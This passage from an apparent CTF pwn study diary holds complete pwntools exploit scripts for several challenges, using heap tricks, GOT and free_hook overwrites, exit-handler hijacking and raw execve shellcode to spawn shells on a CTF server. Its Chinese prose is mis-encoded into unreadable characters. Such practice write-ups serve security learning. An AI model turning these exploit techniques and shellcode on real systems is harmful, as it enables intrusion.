class="line">dele(5)         #backward consolidate</span><br><span class="line">add(0x48)     #4</span><br><span class="line"></span><br><span class="line">dele(2) # two chunks in unsortedbin</span><br><span class="line">add(0x4e8)    #2 now malloc unsortedchunk2 and put unsortedchcunk5 to largebin</span><br><span class="line">dele(2) # in unsortedbin</span><br><span class="line"></span><br><span class="line"># modify unsortedbin</span><br><span class="line">storage &#x3D; 0xabcd0100</span><br><span class="line">fake_chunk &#x3D; storage - 0x20</span><br><span class="line">p1 &#x3D; p64(0)*2 + p64(0) + p64(0x4f1) #size</span><br><span class="line">p1 +&#x3D; p64(0) + p64(fake_chunk)      #bk</span><br><span class="line">edit(7, p1)</span><br><span class="line"></span><br><span class="line"># modify largebin</span><br><span class="line">p2 &#x3D; p64(0)*4 + p64(0) + p64(0x4e1) #size</span><br><span class="line">p2 +&#x3D; p64(0) + p64(fake_chunk+8)    #bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span><br><span class="line">p2 +&#x3D; p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span><br><span class="line">edit(8, p2)</span><br><span class="line"></span><br><span class="line">add(0x48)#2 malloc to 0xabcd0100</span><br><span class="line">edit(2,p64(0)*8)</span><br><span class="line"></span><br><span class="line">backdoor(&#39;\x00&#39;*0x30)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



<h3 id="4-15"><a href="#4-15" class="headerlink" title="4.15"></a>4.15</h3><p>æ¨¡æ¿</p>
<p>starCTF2019 quicksort</p>
<p>å®é™…ä¸Šé‡ç‚¹ä¸æ˜¯å¿«æ’ï¼Œæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºå¯ä»¥è¦†ç›–åˆ°ptræŒ‡é’ˆï¼Œ</p>
<p>æ§åˆ¶æ ˆå¯¹æŒ‡é’ˆæŒ‡å‘å†…å®¹è¯»å†™</p>
<p>è¾“å‡ºåœ°å€ä¸ºåè¿›åˆ¶ï¼Œæ˜¯è´Ÿæ•°ï¼ŒåŠ ä¸Š0x100000000å°±å¯ä»¥è¿˜åŸæˆåå…­è¿›åˆ¶åœ°å€äº†</p>
<p>åŒæ ·å†™å…¥atoi@pltçš„æ—¶å€™ï¼Œä¹Ÿå°†systemåœ°å€å‡å»0x100000000ï¼Œå˜æˆåè¿›åˆ¶è´Ÿæ•°</p>
<p>indexä¹Ÿå­˜æ”¾åœ¨æ ˆä¸Šï¼Œè¦†ç›–æ—¶éœ€è¦æ³¨æ„</p>
<p>atoi(s) // s= str(addr)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;starctf_2019_quicksort&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line"># libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,25177)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">vuln &#x3D; 0x8048816</span><br><span class="line">sla(&#39;want to sort?&#39;,&#39;1&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># [0x804a014] gets@GLIBC_2.0 -&gt; 0xf7d9c3f0 (gets) â—‚â€” push ebp</span><br><span class="line"># [0x804a018] free@GLIBC_2.0 -&gt; 0x8048816 â—‚â€” push   ebp</span><br><span class="line"># ptr+4--&gt;free@plt</span><br><span class="line">sla(&#39;number:&#39;,str(vuln).ljust(0x10,&#39;\x00&#39;)+p32(1)+p32(1)+p32(0)+p32(elf.got[&#39;gets&#39;]))</span><br><span class="line"># pause()</span><br><span class="line">sh.recvuntil(&#39;result:&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39; \n&#39;, drop&#x3D;True)) + \</span><br><span class="line">    0x100000000 - libc.sym[&#39;gets&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;, libc_base)</span><br><span class="line">system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">leak(&#39;system&#39;,system)</span><br><span class="line"></span><br><span class="line">sla(&#39;want to sort?&#39;, &#39;2&#39;)</span><br><span class="line">sla(&#39;number:&#39;, str(system-0x100000000).ljust(0x10, &#39;\x00&#39;) +</span><br><span class="line">    p32(2)+p32(0)+p32(0)+p32(elf.got[&#39;atoi&#39;]))</span><br><span class="line">sla(&#39;number:&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>actf_2019_actfnote</strong></p>
<p>house of force</p>
<p>æ²¡æ³¨æ„åˆ°sizeå¯ä»¥æ˜¯è´Ÿæ•°</p>
<p>editå¯ä»¥è¦†ç›–åˆ°top chunk size</p>
<p>å¦‚ä½•leak libc</p>
<p>strdupè¿”å›çš„å­—ç¬¦ä¸²åœ¨ä½¿ç”¨å®Œä¹‹åè¦åŠæ—¶ç”¨freeé‡Šæ”¾æ‰</p>
<p>æˆ‘ä»¬æŠŠæˆªæ–­ç¬¦è¦†ç›–ï¼Œæ ˆå†…å®¹å°±è¢«å¤åˆ¶åˆ°chunkä¸­ï¼Œä¹‹åshowæ³„æ¼libc</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618477908665-fcf16d88-1ea8-44ec-a82e-5c3fd77e3b4e.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618479134070-27cc4ebb-79e2-468f-8ee1-f6585f092557.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;ACTF_2019_ACTFNOTE&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(</span><br><span class="line">        &#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - 0x07b61e</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def cmd(index):</span><br><span class="line">    sla(&#39;&#x2F;$ &#39;,str(index))</span><br><span class="line">def add(size,name,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&#39;name size: &#39;,str(size))</span><br><span class="line">    sa(&#39;note name: &#39;,name)</span><br><span class="line">    sa(&#39;content: &#39;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&#39; note id: &#39;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla(&#39;note id: &#39;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&#39;note id: &#39;,str(index))</span><br><span class="line">    sa(&#39;content: &#39;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;b&#39;*0x18)#0</span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;&#x2F;bin&#x2F;sh\x00\n&#39;)#1</span><br><span class="line">show(0)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;b\n&#39;)#2</span><br><span class="line">edit(2,&#39;b&#39;*0x10+p64(0)+&#39;\xff&#39;*8)</span><br><span class="line"># top chunkä¸Šç§»å½¢æˆoverlap chunk</span><br><span class="line">add(-0x80, p64(__free_hook), &#39;&#39;)  # 3</span><br><span class="line"># ä¿®æ”¹free_hook</span><br><span class="line">edit(2, p64(system))</span><br><span class="line"># getshell</span><br><span class="line">dele(1)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



<p><strong>hf2020 marksman</strong></p>
<p>å¯ä»¥ä»»æ„åœ°å€å†™3å­—èŠ‚ï¼Œ</p>
<p>ç¨‹åºæœ€åä¼šè°ƒç”¨exit</p>
<blockquote>
<p>åœ¨exit()ä¸­æ‰§è¡Œæµç¨‹ä¸º</p>
<p>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</p>
<p>ç”±äº__rtld_lock_unlock_recursiveå­˜æ”¾åœ¨ç»“æ„ä½“ç©ºé—´ï¼Œä¸ºå¯è¯»å¯å†™ï¼Œé‚£ä¹ˆå¦‚æœå¯ä»¥ä¿®æ”¹__rtld_lock_unlock_recursive,å°±å¯ä»¥åœ¨è°ƒç”¨exit()æ—¶åŠ«æŒç¨‹åºæµã€‚</p>
<p>_rtld_lock_lock_recursiveä¹Ÿæ˜¯ä¸€æ ·çš„æµç¨‹ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œstarssgoã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚</p>
<p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43116977/article/details/105485947">https://blog.csdn.net/qq_43116977/article/details/105485947</a></p>
</blockquote>
<p>æ€»ä¹‹ä¸­é—´è°ƒæ¥è°ƒå»æœ€åä¼šè°ƒç”¨ _rtld_globalç»“æ„ ä½“æˆå‘˜ _dl_rtld_lock_recursive æŒ‡é’ˆ</p>
<p>æ”¹å†™å®ƒå†…å®¹å3ä½ä¸ºogå³å¯</p>
<p>ï¼ˆ_dl_rtld_lock_recursiveæŒ‡å‘çš„å†…å®¹è·ç¦» libc_baseæœ‰ç‚¹è¿œï¼Œä¿®æ”¹åä¸‰å­—èŠ‚è¦å¤šè¯•å‡ æ¬¡æ‰èƒ½æˆåŠŸemmm ï¼‰</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618488882443-55d39820-d87c-456a-a930-0bf1ca9724f7.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489162188-e1230e99-83b1-4631-a682-3fae3f4870ad.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489550470-d97a4b64-5915-4b98-9393-1b815a69da01.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;chall&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc &#x3D; ELF(</span><br><span class="line">    &quot;&#x2F;home&#x2F;ive6ix&#x2F;Desktop&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;node3.buuoj.cn&#39;, 29718)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;: 0x&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16) - libc.sym[&#39;puts&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive &#x3D; libc_base+0x81df60</span><br><span class="line">sla(&#39;shoot!shoot!&#39;, str(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">og &#x3D; libc_base+0x10a38c-5</span><br><span class="line">sla(&#39;biang!&#39;,chr(og&amp;0xff))</span><br><span class="line">sla(&#39;biang!&#39;,chr((og&amp;0xff00)&gt;&gt;8))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;biang!&#39;,chr((og&amp;0xff0000)&gt;&gt;16))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p>è¿™ç§ä¿®æ”¹ _dl_finiå‡½æ•°æŒ‡é’ˆï¼Œæ˜¯glibc2.27åŠ äº† å¯¹vtableçš„æ£€æŸ¥ä¹‹åï¼Œä¸€ä¸ªæ–°çš„ç»•è¿‡æ–¹æ³•</p>
<p>ä¹‹å‰åœ¨gibc2.23çš„æ—¶å€™æ˜¯ <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f54f48ce2695">ä¿®æ”¹stdoutå‡½æ•°è¡¨</a></p>
<h3 id="4-16"><a href="#4-16" class="headerlink" title="4.16"></a>4.16</h3><h3 id="4-17"><a href="#4-17" class="headerlink" title="4.17"></a>4.17</h3><p>æ¥ä¸Šé¢ï¼Œå†ç»ƒä¸€é“ç±»ä¼¼çš„é¢˜</p>
<p>ç»™äº†libcå’Œæ ˆåœ°å€ï¼Œä»»æ„åœ°å€å†™</p>
<p>å¯ä»¥æ”¹å†™æ ˆä¸Šçš„è¿”å›åœ°å€ä¸ºogï¼Œä½†æ˜¯retå‰exitäº†</p>
<p>æ‰€ä»¥è¿˜æ˜¯å¾—ä»exitä¸‹æ‰‹ï¼Œ2.27çš„ç‰ˆæœ¬æ”¹__rtld_lock_unlock_recursive+0x8ä¸ºog</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;.&#x2F;write&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc &#x3D; ELF(</span><br><span class="line">    &quot;&#x2F;home&#x2F;ive6ix&#x2F;Desktop&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;0</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;&#39;, )</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;puts: 0x&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39;\n&#39;,drop&#x3D;True),16) - libc.sym[&#39;puts&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base)</span><br><span class="line">sh.recvuntil(&#39;stack: 0x&#39;)</span><br><span class="line">stack_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16)</span><br><span class="line">leak(&#39;stack_addr&#39;, stack_addr)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive &#x3D; 0x619f68 + libc_base</span><br><span class="line">og &#x3D; [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line">sla(&#39;uit&#39;,&#39;w&#39;)</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;ptr: &#39;,str(_dl_rtld_lock_recursive))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;val: &#39;, str(0x4f322+libc_base))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;uit&#39;, &#39;q&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p>å•Šå­¦ä¸åŠ¨pwnäº†ã€‚ã€‚ã€‚</p>
<p>æ³¨å†Œä¸ªæ–°å·å»å­¦é€†å‘å¥½äº†ã€‚ã€‚ã€‚</p>
<h3 id="4-18"><a href="#4-18" class="headerlink" title="4.18"></a>4.18</h3><p>ä¸Šæµ·äº¤å¤§â€”â€”æ“ä½œç³»ç»Ÿè¯¾ç¨‹</p>
<p>4.19</p>
<p>4.20</p>
<h3 id="4-21"><a href="#4-21" class="headerlink" title="4.21"></a>4.21</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39864373/article/details/111512547">pwné¢˜çš„æ­å»º</a></p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/09/hitctfpwn/">å¤ç°hitCTF2020</a></p>
<p>å‘bsså†™å…¥shellcodeå†è·³è½¬å°±å¥½äº†</p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³• åå¼¹shell è¿˜æ²¡çœ‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;dagongren1&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;127.0.0.1&#39;, 9997)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x0000000000400813</span><br><span class="line">format &#x3D; 0x000000000040088B # %s</span><br><span class="line">pop_rsi_r15 &#x3D; 0x0000000000400811</span><br><span class="line"># scanf(&quot;%s&quot;,&amp;buf)</span><br><span class="line">pay&#x3D;&#39;a&#39;*0x28</span><br><span class="line">pay +&#x3D; p64(pop_rdi)</span><br><span class="line">pay +&#x3D; p64(format)</span><br><span class="line">pay +&#x3D; p64(pop_rsi_r15)</span><br><span class="line">pay +&#x3D; p64(elf.bss()+0x250)</span><br><span class="line">pay +&#x3D; p64(0)</span><br><span class="line">pay +&#x3D; p64(elf.plt[&#39;__isoc99_scanf&#39;])</span><br><span class="line">pay +&#x3D; p64(elf.bss()+0x250)</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;Come On&#39;,pay)</span><br><span class="line"># pause()</span><br><span class="line">sc &#x3D; &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><br><span class="line"># sc&#x3D;asm(shellcraft.sh())</span><br><span class="line">sl(sc)</span><br><span class="line">sl(&#39;exec &#x2F;bin&#x2F;sh 1&gt;&amp;0&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618993139811-95019e88-fa9a-479f-92a6-363d6e16c1dd.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 